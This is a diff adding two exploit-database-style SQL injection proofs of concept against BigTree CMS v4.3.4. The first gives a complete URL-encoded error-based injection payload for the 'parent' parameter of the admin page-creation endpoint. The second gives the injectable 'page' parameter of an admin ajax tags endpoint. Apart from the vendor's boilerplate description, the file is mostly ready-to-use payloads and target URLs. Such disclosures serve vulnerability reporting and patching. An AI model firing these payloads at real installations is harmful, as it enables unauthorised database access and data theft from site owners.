@@ -1,0 +1,51 @@
+===========================================================================================
+# Exploit Title: BigTree CMS - 'parent' SQL Inj.
+# Dork: N/A
+# Date: 24-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.bigtreecms.org/
+# Software Link: https://www.bigtreecms.org/download/core/
+# Version: v4.3.4
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: We strongly believe your content managements system
+shouldn't require
+  you to compromise your vision. BigTree is an extremely extensible open
+source CMS built on PHP and MySQL.
+  It was created by the expert designers, strategists, and developers at
+Fastspot to help you make and maintain better websites.
+===========================================================================================
+# POC - SQLi
+# Parameters : parent
+# Attack Pattern :
+-1%27+and+6%3d3+or+1%3d1%2b(SELECT+1+and+ROW(1%2c1)%3e(SELECT+COUNT(*)%2cCONCAT(CHAR(95)%2cCHAR(33)%2cCHAR(64)%2cCHAR(52)%2cCHAR(100)%2cCHAR(105)%2cCHAR(108)%2cCHAR(101)%2cCHAR(109)%2cCHAR(109)%2cCHAR(97)%2c0x3a%2cFLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.COLLATIONS+GROUP+BY+x)a)%2b%27
+# POST Method :
+http://localhost/BigTree-CMS/site/index.php/admin/pages/create/
+===========================================================================================
+###########################################################################################
+===========================================================================================
+# Exploit Title: BigTree CMS - 'page' SQL Inj.
+# Dork: N/A
+# Date: 24-03-2019
+# Exploit Author: Mehmet EMIROGLU
+# Vendor Homepage: https://www.bigtreecms.org/
+# Software Link: https://www.bigtreecms.org/download/core/
+# Version: v4.3.4
+# Category: Webapps
+# Tested on: Wamp64, Windows
+# CVE: N/A
+# Software Description: We strongly believe your content managements system
+shouldn't require
+  you to compromise your vision. BigTree is an extremely extensible open
+source CMS built on PHP and MySQL.
+  It was created by the expert designers, strategists, and developers at
+Fastspot to help you make and maintain better websites.
+===========================================================================================
+# POC - SQLi
+# Parameters : page
+# Attack Pattern : %2527
+# GET Method :
+http://localhost/BigTree-CMS/site/index.php/admin/ajax/tags/get-page/?page=[SQL
+Inject Here]&sort=
+===========================================================================================
